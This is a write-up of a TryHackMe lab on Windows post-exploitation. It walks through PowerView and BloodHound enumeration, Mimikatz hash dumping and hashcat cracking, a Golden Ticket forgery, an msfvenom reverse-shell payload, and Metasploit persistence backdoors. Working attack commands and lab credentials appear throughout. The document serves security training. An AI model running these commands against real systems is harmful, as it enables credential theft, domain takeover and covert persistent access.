
###### **Room Link: [Post-Exploitation Basics](https://tryhackme.com/r/room/postexploit)** 



In this topic, we cover about post-exploitations enumerations such as powerhouse ,bloodhound, dumping hashes and golden ticket attacks using mimikatz then basic info gathering using windows server tool logs and lastly covers how to maintain access and persistence using metasploit modules and to get backdoor entry to maintain long time access


Now, you complete this room by either connecting to SSH(if you prefer cli) or else with RDP if you prefer Graphical interface and until Task-5 I utilized ssh connection (you can try your own with rdp but the process is same with some key differences such as hashcat )

# **TASK-2: Enumerating with Powerview


Login in to the machine with 
`ssh Administartor@<ip addr>`
`Password: P@$$W0rd`


Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.


1.) Start Powershell - `powershell -ep bypass` -ep bypasses the execution policy of powershell allowing you to easily run scripts

![](https://i.imgur.com/kVdteyd.png)  

2.) Start PowerView - `. .\Downloads\PowerView.ps1`

3.) Enumerate the domain users - `Get-NetUser | select cn`    

![](https://i.imgur.com/jXfVlgK.png)

4.) Enumerate the domain groups - `Get-NetGroup -GroupName *admin*`    

![](https://i.imgur.com/37PiQa9.png)  

Now enumerate the domain further on your own

Here's a cheatsheet to learn more about commands [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)


**1.What is the shared folder that is not set by default?

Use command : `Invoke-ShareFinder`

`Invoke-ShareFinder` is a PowerShell cmdlet used to scan a network for shared resources, such as folders and printers. It retrieves details like share names, paths, and permissions, providing visibility into network shares for management and auditing purposes.

![[Pasted image 20240710115001.png]]

Answer: Share

**2.What operating system is running inside of the network besides Windows Server 2019?

Use command: `Get-NetComputer -fulldata | select operatingsystem`

The command `Get-NetComputer -FullData | Select-Object OperatingSystem` retrieves detailed information about computers in the network and then filters the output to display only the operating system information for each computer. This allows you to see the operating systems of all computers in the network.

![[Pasted image 20240710115549.png]]

**3.I've hidden a flag inside of the users find it

Use command: `Get-NetUser | select cn`

The command `Get-NetUser | select cn` retrieves user information from a network source (likely Active Directory) and selects the "cn" property, which typically represents the Common Name of each user. This allows you to list and view the Common Names of all users in the network domain.

![[Pasted image 20240710115835.png]]


# **Task-3: Enumerating with BloodHound


BloodHound is a powerful tool used for analyzing Active Directory environments to identify and exploit security vulnerabilities. It maps out the relationships between users, computers, groups, and other elements in the Active Directory domain, visualizing attack paths that could be exploited by attackers. 

### Key Features:

1. **Graphical Interface**: BloodHound's graphical interface allows users to visualize complex relationships and attack paths within an Active Directory environment using graph theory and interactive diagrams.

2. **Attack Path Calculation**: It automates the calculation of attack paths, showing how an attacker could move laterally or escalate privileges based on existing permissions and trust relationships.

3. **Data Collection**: BloodHound collects and analyzes data from Active Directory to map out relationships between users, computers, groups, permissions, and other objects, which are then visualized in the interface.

4. **Cypher Query Language (CQL)**: It uses CQL to perform advanced queries and analyses, helping security teams identify and prioritize vulnerabilities and security misconfigurations.

5. **Integration**: BloodHound integrates with other security tools and frameworks, enhancing its utility in red teaming, penetration testing, and overall security assessment of Active Directory environments.

6. **Usage**: Security professionals use BloodHound to discover attack paths, identify excessive permissions, detect domain trust misconfigurations, and simulate potential attacks to strengthen Active Directory security posture.

BloodHound's combination of data collection, analysis, and graphical visualization makes it a valuable tool for comprehensively understanding and securing complex Active Directory environments.


This tool together with `[SharpHound](https://github.com/BloodHoundAD/SharpHound)` takes the user, groups, trusts, etc of the network and collects them into `.json` files to be used inside Bloodhound.

### BloodHound Installation

1. Install Bloodhound in your machine `sudo apt install bloodhound`
2. Run the cmd `sudo neo4j console`
   ![[Pasted image 20240710134527.png]]
3. Now open a browser and go to the following address `http://localhost:7474/` and login in with default credentials `neo4j` for both username and password

    
    ![[Pasted image 20240710134735.png]]
### Getting loot w/ SharpHound

1. `powershell -ep bypass`
2. `. .\Downloads\SharpHound.ps1`
3. `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`
  ![[Pasted image 20240710135337.png]]
4. Transfer the loot folder to your machine using scp.

Secure Copy Protocol (SCP) is a network protocol used for securely transferring files between a local and a remote host or between two remote hosts using SSH for data transfer and authentication. It ensures data confidentiality and integrity during the transfer process.

  5.  `scp Administrator@10.10.91.92:20240710012129_loot.zip loot.zip`

If you run into any troubles like bad Json, try unzipping and add the each folder (which worked for me)

Once you imported the files,  open `menu` select `analysis`.
There you can see some pre-built analytic queries that can be used to enumerate the data

![[Pasted image 20240710152807.png]]

 1.**What service is also a domain admin**?
 ![[Pasted image 20240710151612.png]]

Ans: SQLSERVICE


2.What two users are Kerberoastable?

![[Pasted image 20240710151800.png]]

Ans: SQLSERVICE,KRBTGT


# **Task-4: Dumping hashes with Mimikatz

Mimikatz is a powerful open-source tool used for post-exploitation activities that allows users to view and manipulate authentication credentials on Windows systems. It can extract plaintext passwords, hash values, PIN codes, and Kerberos tickets from memory, making it a popular tool for penetration testers and attackers to gain elevated access and move laterally within a network.

Mimikatz features a command-line interface and a variety of modules that enable it to perform various tasks, including dumping password hashes, extracting Kerberos tickets, and even performing pass-the-hash and pass-the-ticket attacks. This tool highlights the importance of securing credentials and minimizing the risk of credential theft in Windows environments.

  **Dump hashes with mimikatz

1.) `cd Downloads` to navigate to the directory mimikatz is located at then run the command `.\mimikatz.exe` to execute it.

![[Pasted image 20240710154838.png]]

2.) `privilege::debug` ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly.

![[Pasted image 20240710155007.png]]

3.) `lsadump::lsa /patch` Dump those hashes!

![[Pasted image 20240710155155.png]]

Thus, you got the hashes.

Now, in order to crack them you can use hashcat by invoking command
`hashcat -m 1000 <hash> rockyou.txt`

The command `hashcat -m 1000 <hash> rockyou.txt` is used to perform a password cracking operation using the Hashcat tool. Here's a breakdown of the command:

- `hashcat`: This is the executable for the Hashcat tool, which is used for password recovery by brute-force attack, dictionary attack, and other types of password cracking methods.

- `-m 1000`: This specifies the hash type. The `-m` option allows you to define the hash algorithm that Hashcat will use to crack the password. The value `1000` corresponds to the NTLM hash type, which is commonly used for Windows passwords.

- `<hash>`: This represents the hash value you want to crack. In an actual command, you would replace `<hash>` with the specific hash value or the path to a file containing the hash value(s) you are targeting.

- `rockyou.txt`: This is the wordlist file that Hashcat will use for the dictionary attack. The `rockyou.txt` file is a widely used wordlist that contains millions of common passwords and is often used in password cracking attempts.

### Full Explanation

When you run this command, Hashcat will:
1. **Identify the Hash Type**: Use the NTLM hash algorithm specified by `-m 1000`.
2. **Target the Hash**: Attempt to crack the provided hash value.
3. **Use the Wordlist**: Check each password in the `rockyou.txt` wordlist against the hash value to find a match.

### Example Usage

If you have an NTLM hash `31d6cfe0d16ae931b73c59d7e0c089c0`, you would run the command like this:

```bash
hashcat -m 1000 31d6cfe0d16ae931b73c59d7e0c089c0 rockyou.txt
```

Hashcat will then try every password in `rockyou.txt` to see if it matches the hash `31d6cfe0d16ae931b73c59d7e0c089c0`.

### Summary

- **Tool**: `hashcat`
- **Hash Type**: NTLM (`-m 1000`)
- **Hash to Crack**: `<hash>` (replace with your actual hash)
- **Wordlist**: `rockyou.txt`

This command attempts to crack an NTLM hash using passwords from the `rockyou.txt` wordlist.

1.**What is the Machine1 Password?**

![[Pasted image 20240710160805.png]]

Now, copy the hash value and  `<hash>` field of hashcat cmd and specify path to rockyou.txt

![[Pasted image 20240710161421.png]]

Answer: Password1

2.**What is the Machine2 Hash?**

Answer: `c39f2beb3d2ec06a62cb887fb391dee0`

![[Pasted image 20240710161555.png]]

Additionally, you can prefer to use johntheripper or online hash-crackers too.

# **Task-5: Golden ticket attack with Mimikatz

Mimikatz is not limited to dumping of hashes , it also used to carry out golden ticket attacks


A Golden Ticket, as manipulated by Mimikatz, is a forged Kerberos ticket granting long-term access to a Windows domain. It enables unauthorized access by creating a ticket-granting ticket (TGT) with domain controller (DC) privileges, allowing persistent exploitation and traversal within the network, emphasizing the criticality of securing Kerberos infrastructures.

Similar to your previous task

Navigate to download and execute mimikatz and then use privilege debug

Dump the krbtgt Hash -

﻿1.) `cd downloads && mimikatz.exe`    

2.) `privilege::debug` ensure this outputs [privilege "20" ok]

﻿3.) `lsadump::lsa /inject /name:krbtgt` This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

![[Pasted image 20240710225206.png]]

**Creating a Golden Ticket**

1. `kerberos::golden /user: /domain: /sid: /krbtgt: /id:`
    Fill fields with appropriate parameters such as
   `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166/krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500`

![[Pasted image 20240710230848.png]]

**Use the Golden Ticket to access other machine**

1. `misc::cmd`-It opens a new cmd prompt with elevated privileges to all machines

![[Pasted image 20240710231027.png]]

 2. Access other Machines! - You will now have another command prompt with access to all other machines on the network
 
 
 Connect to ovpn in your windows and specify the ip,username and password  shown in tryhackme.

Once conneected a windows pop up will appear with server manager

![[Pasted image 20240711114523.png]]

Now, head on `Tools` and select `Active Directory Users and Computers`

![[Pasted image 20240711114658.png]]


It displays the list of users on the domain and some other useful tabs such as groups and computers.


![[Pasted image 20240711114946.png]]

1. **What tool allows to view the event logs?**
    Ans: Event Viewer 
    ![[Pasted image 20240711115245.png]]
![[Pasted image 20240711115401.png]]

2. **What is the SQL Service password?**
  Ans:  MYpassword123#
  
  You can find it in `Active Directory users and Computers` which you opened previously
![[Pasted image 20240711115743.png]]

# **TASK-7: Maintaining Access**

There are a quite a few ways to maintain access on a machine or network we will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.

There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room.

**Generating a Payload w/ msfvenom**

1. Create a payload by specifying attacker machine IP and port and specify name of the file.
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.37 LPORT=5555 -f exe -o shell.exe`
2. Deliver it to the target machine by any means , I utilized `secure copy protocol` to transfer the `shell.exe` to the windows machine. 
    ![[Pasted image 20240711140929.png]]
   
   ![[Pasted image 20240711141110.png]] 

3. Now  open metasploit in attacker machine by invoking the command `msfconsole`
   
   Then follow the steps as shown in image
   ![[Pasted image 20240711135532.png]]


   Then set the `LHOST`  and `LPORT` as desired and set the payload `windows/meterpreter/reverse_tcp`

    ![[Pasted image 20240711135633.png]]


6. Now, start the listener by using command `run` , once you run that exe in the target windows machine, it will open a shell as shown in image below.
    ![[Pasted image 20240711135959.png]]
 
 7. Once done with above process background the shell using `bg` or `background`. 
    ![[Pasted image 20240711144520.png]]

8. Use the `exploit/windows/local/persistence` module to create a persistent backdoor on the target system. By default, this module sends a payload every 10 seconds, but you can customize this interval to any duration you prefer.

    ![[Pasted image 20240711144601.png]]

9. Set the session to the session that we backgrounded in this case session 1 
     ![[Pasted image 20240711144829.png]]
 10. Now, when you the run it back , the persistent module will create a new session if in case the old one died. 
    
 `Note: If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to `windows/meterpreter/reverse_tcp` allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.`

 Awesome! Now you have successfully learnt to install a Backdoor in a remote machine.
 
 Thus, we are done with the topic of Post-exploitation Basics.